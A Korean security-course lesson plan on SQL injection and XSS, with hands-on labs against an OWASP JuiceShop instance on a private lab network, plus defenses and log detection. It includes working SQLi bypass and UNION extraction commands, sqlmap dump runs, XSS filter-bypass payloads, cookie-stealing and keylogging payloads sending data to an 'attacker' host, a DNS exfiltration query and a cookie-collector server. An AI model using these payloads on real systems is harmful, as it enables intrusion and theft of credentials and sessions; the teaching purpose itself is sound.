# Week 03: 웹 공격 기초 — SQL Injection, XSS

## 학습 목표
- SQL Injection(SQLi)의 원리, 유형, 공격 기법을 체계적으로 이해한다
- Cross-Site Scripting(XSS)의 3가지 유형(Reflected, Stored, DOM-based)을 구분하고 각각의 공격 벡터를 설명할 수 있다
- OWASP JuiceShop에서 SQL Injection을 실행하여 인증 우회와 데이터 추출을 수행할 수 있다
- XSS 페이로드를 작성하여 쿠키 탈취 시나리오를 시연할 수 있다
- 웹 공격의 방어 기법(입력값 검증, Prepared Statement, CSP 등)을 이해한다
- MITRE ATT&CK에서 웹 공격이 어떻게 분류되는지 매핑할 수 있다
- Blue Team 관점에서 웹 공격 로그를 식별하는 방법을 안다

## 전제 조건
- Week 01-02 완료 (정찰, 취약점 스캐닝 경험)
- HTTP 프로토콜 기본 이해 (GET, POST, 헤더, 쿠키)
- SQL 기본 문법 (SELECT, WHERE, AND/OR)
- HTML/JavaScript 기초

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | SQL Injection 이론 상세 | 강의 |
| 0:40-1:10 | XSS 이론 상세 | 강의 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | SQL Injection 실습 (JuiceShop) | 실습 |
| 2:00-2:30 | XSS 실습 (JuiceShop) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 종합 웹 공격 시나리오 실습 | 실습 |
| 3:10-3:40 | 방어 기법 + 퀴즈 + 과제 안내 | 토론/퀴즈 |

---

# Part 1: SQL Injection 이론 상세 (40분)

## 1.1 SQL Injection이란?

SQL Injection(SQLi)은 웹 애플리케이션의 입력값을 통해 악의적인 SQL 구문을 삽입하여 데이터베이스를 비정상적으로 조작하는 공격이다.

**MITRE ATT&CK 매핑:**
```
전술: TA0001 — Initial Access (초기 접근)
  +-- T1190 — Exploit Public-Facing Application
        +-- 절차: 로그인 폼에 ' OR 1=1-- 삽입하여 인증 우회

전술: TA0009 — Collection (데이터 수집)
  +-- T1213 — Data from Information Repositories
        +-- 절차: UNION SELECT로 DB 테이블 전체 덤프
```

**OWASP 분류:**
- OWASP Top 10 2021: A03 — Injection
- CWE: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)

### 취약한 코드 vs 안전한 코드

**취약한 코드 (Python/Flask):**
```python
# 사용자 입력을 직접 SQL에 삽입 (절대 하면 안 됨!)
query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"
cursor.execute(query)
```

**사용자가 email에 `' OR 1=1--`를 입력하면:**
```sql
SELECT * FROM users WHERE email='' OR 1=1--' AND password=''
                                      ^^^^^^^^ 항상 참
                                              ^^ 이후 주석 처리
-- 결과: 모든 사용자 레코드 반환 → 첫 번째 사용자(보통 admin)로 로그인
```

**안전한 코드 (Prepared Statement):**
```python
# 파라미터 바인딩 사용 (안전)
query = "SELECT * FROM users WHERE email=%s AND password=%s"
cursor.execute(query, (email, password))
# 사용자 입력이 SQL 구문이 아닌 "데이터"로 처리됨
```

## 1.2 SQL Injection 유형 분류

### In-band SQLi (Classic)

공격 결과가 동일 채널(웹 페이지)로 반환되는 유형이다.

| 하위 유형 | 설명 | 특징 |
|---------|------|------|
| **Error-based** | SQL 에러 메시지에서 정보 추출 | 에러 메시지가 노출되어야 함 |
| **Union-based** | UNION SELECT로 추가 데이터 추출 | 원래 쿼리의 컬럼 수를 알아야 함 |

**Error-based 예시:**
```sql
-- 입력: ' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
-- 에러: Conversion failed when converting the nvarchar value 'users' to data type int
-- 결과: 테이블 이름 'users'를 에러 메시지에서 추출
```

**Union-based 예시:**
```sql
-- 1단계: 컬럼 수 확인
' ORDER BY 1-- (정상)
' ORDER BY 2-- (정상)
' ORDER BY 3-- (에러) → 컬럼 2개

-- 2단계: UNION SELECT로 데이터 추출
' UNION SELECT username, password FROM users--
```

### Blind SQLi

공격 결과가 직접 보이지 않는 유형이다. 참/거짓 응답의 차이로 데이터를 추론한다.

| 하위 유형 | 설명 | 특징 |
|---------|------|------|
| **Boolean-based** | 참/거짓에 따라 다른 응답 | 응답 내용의 차이로 판별 |
| **Time-based** | SLEEP() 등으로 응답 시간 차이 유도 | 응답 시간으로 판별 |

**Boolean-based 예시:**
```sql
-- 입력: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
-- 결과: 정상 페이지 → 첫 글자가 'a'
-- 입력: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='b'--
-- 결과: 에러 페이지 → 첫 글자가 'b'가 아님
```

**Time-based 예시:**
```sql
-- 입력: ' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a', SLEEP(5), 0)--
-- 결과: 5초 지연 → 첫 글자가 'a'
-- 결과: 즉시 응답 → 첫 글자가 'a'가 아님
```

### Out-of-band SQLi

데이터를 DNS, HTTP 등 다른 채널로 전송하는 유형이다.

```sql
-- DNS 기반 (MySQL)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'));
```

### SQLi 유형 비교 종합표

| 유형 | 난이도 | 속도 | 데이터 추출 | 탐지 난이도 |
|------|--------|------|-----------|------------|
| Error-based | 낮음 | 빠름 | 직접 가능 | 쉬움 (에러 로그) |
| Union-based | 중간 | 빠름 | 대량 가능 | 쉬움 |
| Boolean-based | 높음 | 느림 | 1비트씩 | 중간 |
| Time-based | 높음 | 매우 느림 | 1비트씩 | 어려움 |
| Out-of-band | 높음 | 빠름 | 직접 가능 | 어려움 |

## 1.3 SQL Injection 방어 기법

| 방어 기법 | 효과 | 구현 복잡도 | 설명 |
|---------|------|-----------|------|
| Prepared Statement | 매우 높음 | 낮음 | 파라미터 바인딩으로 SQL/데이터 분리 |
| ORM 사용 | 높음 | 낮음 | SQLAlchemy, Hibernate 등 |
| 입력값 검증 | 중간 | 중간 | 화이트리스트 기반 필터링 |
| WAF | 중간 | 낮음 | SQL 패턴 탐지/차단 |
| 최소 권한 | 보조 | 낮음 | DB 사용자 권한 최소화 |
| 에러 메시지 숨김 | 보조 | 낮음 | 상세 에러를 사용자에게 노출하지 않음 |

---

# Part 2: XSS 이론 상세 (30분)

## 2.1 XSS (Cross-Site Scripting)란?

XSS는 웹 페이지에 악의적인 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되게 하는 공격이다.

**MITRE ATT&CK 매핑:**
```
전술: TA0001 — Initial Access
  +-- T1189 — Drive-by Compromise
        +-- 절차: 악성 스크립트가 삽입된 웹 페이지를 피해자가 방문

전술: TA0006 — Credential Access
  +-- T1539 — Steal Web Session Cookie
        +-- 절차: document.cookie를 공격자 서버로 전송
```

## 2.2 XSS 유형 분류

### Reflected XSS (반사형)

```
[1] 공격자 → 악성 URL 작성
[2] 공격자 → 피해자에게 URL 전송 (이메일, 메신저 등)
[3] 피해자 → 악성 URL 클릭
[4] 서버 → 검색 결과 페이지에 스크립트 포함하여 응답
[5] 피해자 브라우저 → 스크립트 실행 → 쿠키가 공격자에게 전송
```

**특징:** URL에 악성 코드가 포함됨, 피해자가 클릭해야 동작, 일회성 공격

### Stored XSS (저장형)

```
[1] 공격자 → 게시판에 악성 스크립트 포함 게시글 작성
[2] 서버 → DB에 악성 스크립트가 포함된 게시글 저장
[3] 피해자 → 해당 게시글 조회
[4] 서버 → DB에서 게시글을 읽어 페이지에 렌더링 (스크립트 포함)
[5] 피해자 브라우저 → 스크립트 실행 → 쿠키 탈취
```

**특징:** 악성 코드가 서버 DB에 영구 저장됨, 모든 방문자가 피해, Reflected보다 위험도 높음

### DOM-based XSS

```
[1] 공격자 → URL의 fragment에 악성 코드
[2] 클라이언트 JavaScript가 fragment를 읽어 DOM에 삽입
[3] 서버를 거치지 않고 브라우저에서 직접 실행됨
```

**특징:** 서버 측 로그에 흔적이 남지 않음, 탐지가 가장 어려움

### XSS 유형 비교

| 유형 | 지속성 | 공격 벡터 | 피해 범위 | 탐지 난이도 | CVSS 일반 |
|------|--------|---------|---------|------------|---------|
| Reflected | 일회성 | URL 파라미터 | 클릭한 사용자 | 중간 | 6.1 |
| Stored | 영구 | DB 저장 | 모든 방문자 | 쉬움 | 6.5-8.0 |
| DOM-based | 일회성 | DOM 조작 | 클릭한 사용자 | 어려움 | 6.1 |

## 2.3 XSS 공격 페이로드 패턴

| 목적 | 페이로드 | 설명 |
|------|---------|------|
| 테스트 | `<script>alert('XSS')</script>` | 기본 확인용 |
| 쿠키 탈취 | `<script>new Image().src='http://attacker/c='+document.cookie</script>` | 쿠키를 외부로 전송 |
| 키로깅 | `<script>document.onkeypress=function(e){new Image().src='http://attacker/k='+e.key}</script>` | 키 입력 가로채기 |
| 리다이렉션 | `<script>location='http://attacker/phish'</script>` | 피싱 사이트로 이동 |
| 페이지 변조 | `<script>document.body.innerHTML='<h1>Hacked</h1>'</script>` | 페이지 내용 변경 |

### 필터 우회 기법

| 기법 | 원본 | 우회 페이로드 | 우회 원리 |
|------|------|-------------|---------|
| 대소문자 혼합 | `<script>` | `<ScRiPt>alert(1)</ScRiPt>` | 대소문자 구분 없는 파싱 |
| 태그 변형 | `<script>` | `<img src=x onerror=alert(1)>` | script 이외의 이벤트 핸들러 |
| 인코딩 | `<script>` | `%3Cscript%3Ealert(1)%3C/script%3E` | URL 인코딩 |
| HTML 엔티티 | `alert` | `&#97;&#108;&#101;&#114;&#116;(1)` | HTML 엔티티 디코딩 |
| JavaScript 프로토콜 | - | `javascript:alert(1)` | href 속성 활용 |

## 2.4 XSS 방어 기법

| 방어 기법 | 효과 | 설명 |
|---------|------|------|
| 출력 인코딩 (Output Encoding) | 매우 높음 | `<` → `&lt;`, `>` → `&gt;` 변환 |
| Content Security Policy (CSP) | 높음 | 인라인 스크립트 실행 차단 |
| HttpOnly 쿠키 | 중간 | JavaScript에서 쿠키 접근 차단 |
| 입력값 검증 | 중간 | 화이트리스트 기반 허용 문자 제한 |
| WAF | 중간 | XSS 패턴 탐지/차단 |

---

# Part 3: SQL Injection 실습 (40분)

## 실습 3.1: JuiceShop 인증 우회 (SQL Injection)

### Step 1: 정상 로그인 동작 확인

> **실습 목적**: SQL Injection 공격 전에 정상 로그인 프로세스를 이해한다.
>
> **배우는 것**: HTTP 요청/응답 구조와 인증 메커니즘

```bash
# JuiceShop 접속 확인
curl -s http://10.20.30.80:3000 | head -3
# 예상 출력: <!DOCTYPE html>...

# 정상 로그인 시도 (존재하지 않는 계정)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"wrongpassword"}'
# 예상 출력: "Invalid email or password" 메시지
```

> **결과 해석**:
> - 정상 로그인은 이메일과 비밀번호를 JSON으로 전송
> - 서버는 DB에서 해당 계정을 조회하여 인증 처리
> - 잘못된 자격증명이면 에러 응답
>
> **실전 활용**: 공격 전에 정상 동작을 파악해야 비정상 동작을 비교할 수 있다.

### Step 2: SQL Injection으로 인증 우회

> **실습 목적**: SQL Injection 페이로드를 사용하여 비밀번호 없이 관리자로 로그인한다.
>
> **배우는 것**: SQL Injection의 실제 동작과 인증 우회 메커니즘

```bash
# SQL Injection 페이로드로 관리자 로그인 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}'
# 예상 출력:
# {
#   "authentication": {
#     "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
#     "bid": 1,
#     "umail": "admin@juice-sh.op"
#   }
# }

# 또는 다른 페이로드
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"doesntmatter"}'
# 예상 출력: admin 토큰 반환 (비밀번호 검사가 주석 처리됨)
```

> **결과 해석**:
> - `' OR 1=1--` 입력 시 SQL이 다음과 같이 변조됨:
>   ```sql
>   SELECT * FROM Users WHERE email='' OR 1=1--' AND password='anything'
>   ```
> - `OR 1=1`이 항상 참이므로 모든 사용자 레코드가 반환됨
> - 첫 번째 레코드가 보통 admin이므로 관리자로 로그인됨
> - `--`는 SQL 주석으로, 이후의 `AND password='...'` 부분을 무효화
>
> **실전 활용**: 이것은 가장 기본적인 SQLi이다. 실제 환경에서는 WAF, 입력 검증 등으로 차단될 수 있다.
>
> **명령어 해설**:
> - `'\''`: bash에서 작은따옴표를 이스케이프하는 방법
> - `--`: SQL 한 줄 주석 (MySQL, PostgreSQL, SQLite)
>
> **트러블슈팅**:
> - JSON 파싱 에러: 따옴표 이스케이프가 올바른지 확인
> - 500 에러: SQLi가 SQL 구문 에러를 발생시킨 경우 → 페이로드 수정

### Step 3: UNION SELECT로 데이터 추출

> **실습 목적**: UNION SELECT를 사용하여 데이터베이스에서 직접 데이터를 추출한다.
>
> **배우는 것**: Union-based SQL Injection의 단계별 공격 방법

```bash
# JuiceShop 검색 기능에서 SQLi 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q='))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--" | python3 -m json.tool 2>/dev/null | head -30
# 예상 출력: DB 스키마 정보 (테이블 구조)

# 사용자 테이블에서 이메일과 비밀번호 해시 추출
curl -s "http://10.20.30.80:3000/rest/products/search?q='))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | python3 -m json.tool 2>/dev/null | head -40
# 예상 출력:
# {
#   "data": [
#     {
#       "name": "admin@juice-sh.op",
#       "description": "0192023a7bbd73250516f069df18b500",  ← MD5 해시
#       ...
#     }
#   ]
# }
```

> **결과 해석**:
> - `sqlite_master`: SQLite의 시스템 테이블로, 모든 테이블의 구조를 담고 있다
> - `UNION SELECT`: 원래 쿼리 결과에 추가 쿼리 결과를 합친다
> - MD5 해시: `0192023a7bbd73250516f069df18b500` → "admin123"으로 복원 가능
>
> **실전 활용**: 비밀번호 해시를 추출한 후 오프라인에서 크래킹하면 다른 서비스에서도 동일 비밀번호 재사용 가능성이 있다.

### Step 4: sqlmap을 활용한 자동화 공격

> **실습 목적**: sqlmap 도구를 사용하여 SQL Injection 탐지와 공격을 자동화한다.
>
> **배우는 것**: sqlmap의 기본 사용법과 자동 데이터 추출

```bash
# sqlmap으로 SQLi 자동 탐지
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" --batch --level=2 2>/dev/null | tail -20
# 예상 출력:
# [INFO] GET parameter 'q' is vulnerable. Injection type: ...

# DB 목록 추출
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" --batch --dbs 2>/dev/null | tail -10
# 예상 출력: available databases [1]: main

# 테이블 목록 추출
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" --batch -D main --tables 2>/dev/null | tail -20
# 예상 출력: Users, Products, BasketItems, ...

# 사용자 데이터 추출
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" --batch -D main -T Users --dump 2>/dev/null | tail -20
# 예상 출력: 사용자 이메일, 비밀번호 해시, 역할 등
```

> **결과 해석**:
> - sqlmap은 자동으로 SQLi 유형을 판별하고 최적의 페이로드를 선택한다
> - `--batch`: 대화형 질문에 기본값으로 자동 응답
> - `--dump`: 테이블 데이터를 CSV로 추출
>
> **트러블슈팅**:
> - "connection timed out": 대상 서버 접근 불가 → URL 확인
> - "all tested parameters do not appear to be injectable": 추가 파라미터나 헤더 확인

## 실습 3.2: XSS 공격 실습

### Step 1: Reflected XSS 기본 테스트

> **실습 목적**: JuiceShop에서 Reflected XSS를 찾아 실행한다.
>
> **배우는 것**: XSS 취약점 탐색과 기본 페이로드 작성

```bash
# 브라우저에서 접근: http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
# curl로 테스트 (서버 응답에 입력값 반영 여부 확인)
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E" | head -5
# 예상 출력: 입력값이 응답에 포함되는지 확인

# 다양한 XSS 페이로드 테스트
echo "=== XSS 페이로드 테스트 ==="
for payload in \
  "%3Cscript%3Ealert(1)%3C/script%3E" \
  "%3Cimg%20src=x%20onerror=alert(1)%3E" \
  "%3Csvg%20onload=alert(1)%3E"; do
  RESPONSE=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$payload" | wc -c)
  echo "  Payload: $payload → Response size: $RESPONSE bytes"
done
```

> **결과 해석**:
> - 응답에 입력값이 인코딩 없이 포함되면 XSS 가능
> - JuiceShop은 DOM-based XSS에 취약하므로 브라우저에서 직접 확인 필요
>
> **실전 활용**: XSS 테스트는 브라우저에서 직접 수행하는 것이 가장 정확하다. curl은 JavaScript를 실행하지 않으므로 DOM-based XSS는 탐지 불가.

### Step 2: Stored XSS (저장형) 시뮬레이션

> **실습 목적**: 저장형 XSS의 동작 원리를 이해하고, 영향 범위가 넓은 이유를 체험한다.
>
> **배우는 것**: 저장형 XSS의 위험성과 탐지 방법

```bash
# JuiceShop에 계정 등록
curl -s -X POST http://10.20.30.80:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email":"xss@test.com",
    "password":"Test1234!",
    "passwordRepeat":"Test1234!",
    "securityQuestion":{"id":1,"question":"What is your name?"},
    "securityAnswer":"test"
  }'
# 예상 출력: 사용자 생성 성공

# 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"xss@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)

# 피드백에 XSS 페이로드 삽입 (Stored XSS)
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"comment":"Great shop! <script>alert(document.cookie)</script>","rating":5}'
# → 관리자가 피드백을 볼 때 스크립트 실행될 수 있음
```

> **결과 해석**:
> - 피드백 내용이 DB에 저장되므로, 관리자가 피드백 페이지를 볼 때마다 스크립트가 실행됨
> - 이것이 Stored XSS의 핵심: 한 번 삽입하면 모든 방문자에게 영향

### Step 3: 쿠키 탈취 시나리오 시뮬레이션

> **실습 목적**: XSS를 통한 세션 쿠키 탈취의 전체 과정을 이해한다.
>
> **배우는 것**: XSS 공격의 실제 피해와 방어 필요성

```bash
# 간이 쿠키 수집 서버 설정 (opsclaw에서)
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        print(f'[STOLEN] {query}')
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass
HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
" &
COLLECTOR_PID=$!
echo "쿠키 수집 서버 PID: $COLLECTOR_PID (포트 9999)"

# XSS 페이로드: <script>new Image().src='http://10.20.30.201:9999/steal?cookie='+document.cookie</script>

# 테스트 확인
curl -s "http://10.20.30.201:9999/steal?cookie=test_session_id=abc123"
# 서버 로그에서 확인: [STOLEN] cookie=test_session_id=abc123

# 정리
kill $COLLECTOR_PID 2>/dev/null
```

> **결과 해석**:
> - XSS를 통해 피해자의 세션 쿠키가 공격자 서버로 전송됨
> - 공격자는 탈취한 쿠키로 세션 하이재킹 수행 가능
> - HttpOnly 쿠키 설정으로 이 공격을 차단할 수 있음

---

# Part 4: 종합 웹 공격 시나리오 + 방어 확인 (30분)

## 실습 4.1: 공격 체인 시뮬레이션

### Step 1: SQLi → 데이터 추출 → 세션 탈취 전체 시나리오

> **실습 목적**: SQL Injection과 XSS를 조합한 현실적인 공격 시나리오를 체험한다.
>
> **배우는 것**: 여러 취약점을 연계(chain)하여 더 큰 피해를 유발하는 공격 패턴

```bash
echo "=== 공격 체인 시뮬레이션 ==="

# Phase 1: SQLi로 관리자 인증 토큰 획득
echo "[Phase 1] SQLi로 관리자 로그인 우회"
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token','FAIL'))" 2>/dev/null)
echo "  Admin Token: ${ADMIN_TOKEN:0:50}..."

# Phase 2: 관리자 권한으로 사용자 목록 조회
echo "[Phase 2] 관리자 권한으로 사용자 데이터 접근"
curl -s http://10.20.30.80:3000/api/Users \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -c "
import sys,json
try:
    users = json.load(sys.stdin).get('data',[])
    print(f'  발견된 사용자: {len(users)}명')
    for u in users[:5]:
        print(f'    - {u.get(\"email\",\"?\")} (role: {u.get(\"role\",\"?\")})')
except: print('  파싱 실패')
" 2>/dev/null

# Phase 3: UNION SELECT로 추가 데이터 추출
echo "[Phase 3] DB에서 추가 정보 추출"
curl -s "http://10.20.30.80:3000/rest/products/search?q='))%20UNION%20SELECT%20email,password,role,4,5,6,7,8,9%20FROM%20Users--" 2>/dev/null | python3 -c "
import sys,json
try:
    items = json.load(sys.stdin).get('data',[])
    for item in items[:5]:
        name = item.get('name','')
        desc = item.get('description','')
        if '@' in str(name):
            print(f'    Email: {name}, Hash: {desc[:20]}...')
except: print('  추출 실패')
" 2>/dev/null

echo "[완료] 공격 체인 시뮬레이션 종료"
```

> **결과 해석**:
> - Phase 1: SQLi로 인증 우회 → 관리자 JWT 토큰 획득
> - Phase 2: 관리자 토큰으로 사용자 API 접근 → 전체 사용자 정보 유출
> - Phase 3: UNION SELECT로 비밀번호 해시까지 추출
> - 이것이 현실 공격의 전형적인 패턴: 취약점 1개 → 연쇄 공격 → 대규모 피해

### Step 2: OpsClaw를 활용한 웹 공격 증적 기록

> **실습 목적**: 웹 공격 과정을 OpsClaw로 체계적으로 기록한다.
>
> **배우는 것**: 모의해킹 증적 관리의 중요성

```bash
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week03-web-attack","request_text":"웹 공격 실습 (SQLi, XSS)","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"SQLi 인증우회","instruction_prompt":"curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"\\u0027 OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" | head -5","risk_level":"medium","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"HTTP 헤더 분석","instruction_prompt":"curl -sI http://10.20.30.80:3000 | grep -iE \"x-frame|x-content|csp|x-xss\"","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":3,"title":"보안헤더 점검","instruction_prompt":"curl -sI http://10.20.30.80:80 | grep -iE \"x-frame|x-content|server|csp\"","risk_level":"low","subagent_url":"http://localhost:8002"}
    ],
    "subagent_url":"http://localhost:8002"
  }' | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(f'결과: {d[\"overall\"]}')
for t in d.get('task_results',[]):
    print(f'  [{t[\"order\"]}] {t[\"title\"]:20s} → {t[\"status\"]}')
"
```

### Step 3: Blue Team 관점 — 웹 공격 로그 분석

> **실습 목적**: 앞서 수행한 웹 공격이 서버 로그에서 어떻게 보이는지 확인한다.
>
> **배우는 것**: 웹 공격의 로그 흔적과 탐지 패턴

```bash
# Apache 접근 로그에서 SQLi 흔적 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "cat /var/log/apache2/access.log 2>/dev/null | grep -i 'union\|select\|or%201' | tail -10"
# 예상 출력: UNION SELECT가 포함된 요청 로그

# Suricata IDS에서 웹 공격 탐지 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "cat /var/log/suricata/fast.log 2>/dev/null | grep -i 'sql\|xss\|injection' | tail -10"
# 예상 출력: SQL Injection, XSS 관련 IDS 경보

# Wazuh에서 웹 공격 알림 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "cat /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -i 'sql\|xss\|web' | tail -10"
# 예상 출력: Wazuh 규칙에 매칭된 웹 공격 경보
```

> **결과 해석**:
> - Apache 로그: URL에 UNION, SELECT, OR 1=1 등의 패턴이 기록됨
> - Suricata: SQL Injection 시그니처에 매칭되어 경보 발생
> - Wazuh: 웹 서버 로그를 분석하여 공격 패턴 탐지
>
> **실전 활용**: Blue Team은 이러한 로그 패턴을 실시간 모니터링하여 웹 공격을 조기 탐지한다.

---

## 검증 체크리스트
- [ ] SQL Injection의 3가지 유형(In-band, Blind, Out-of-band)을 설명할 수 있는가
- [ ] JuiceShop에서 SQLi로 관리자 인증을 우회했는가
- [ ] UNION SELECT로 사용자 데이터를 추출했는가
- [ ] XSS의 3가지 유형(Reflected, Stored, DOM-based)을 구분할 수 있는가
- [ ] XSS 페이로드를 작성하여 테스트했는가
- [ ] 쿠키 탈취 시나리오를 이해했는가
- [ ] SQLi + XSS 공격 체인을 시뮬레이션했는가
- [ ] Blue Team 관점에서 웹 공격 로그를 확인했는가
- [ ] 방어 기법(Prepared Statement, CSP, HttpOnly)을 이해했는가

## 자가 점검 퀴즈

1. `' OR 1=1--` 페이로드가 인증을 우회하는 원리를 SQL 쿼리 변조 관점에서 단계별로 설명하라.

2. Union-based SQLi를 수행하기 전에 원래 쿼리의 컬럼 수를 알아야 하는 이유와 방법을 설명하라.

3. Blind SQLi(Boolean-based)로 데이터베이스 이름의 첫 글자를 알아내는 과정을 구체적으로 서술하라.

4. Reflected XSS와 Stored XSS의 공격 벡터, 지속성, 피해 범위를 비교하라.

5. `<script>alert(1)</script>`가 필터링될 때 사용할 수 있는 우회 페이로드 3가지를 제시하라.

6. Prepared Statement(파라미터 바인딩)가 SQL Injection을 방어하는 원리를 설명하라.

7. Content Security Policy(CSP)가 XSS를 방어하는 원리를 설명하라. `script-src 'self'`의 의미는?

8. HttpOnly 쿠키 플래그가 XSS 쿠키 탈취를 방어하는 원리를 설명하라.

9. sqlmap의 `--batch --level=2 --risk=2` 옵션의 의미를 각각 설명하라.

10. 웹 서버 접근 로그에서 SQL Injection 시도를 탐지하기 위한 grep 패턴을 3개 이상 작성하라.

## 과제

### 과제 1: JuiceShop SQL Injection 챌린지 (필수)
- JuiceShop의 SQLi 관련 챌린지 최소 3개 완료
- 각 챌린지의 페이로드, 실행 과정, 결과를 스크린샷과 함께 문서화
- 사용한 SQL 구문의 동작 원리를 상세히 설명

### 과제 2: XSS 필터 우회 연구 (선택)
- JuiceShop에서 XSS 관련 챌린지 2개 이상 완료
- 필터 우회에 사용한 기법과 그 원리를 설명
- 각 XSS 유형별 방어 방법을 실제 코드 예시와 함께 제시

### 과제 3: WAF 규칙 작성 (도전)
- 이번 실습에서 사용한 SQLi/XSS 페이로드를 차단하는 ModSecurity 규칙을 작성
- 규칙이 정상 트래픽을 차단하지 않는지 테스트 (오탐 방지)
- 작성한 규칙과 테스트 결과를 제출
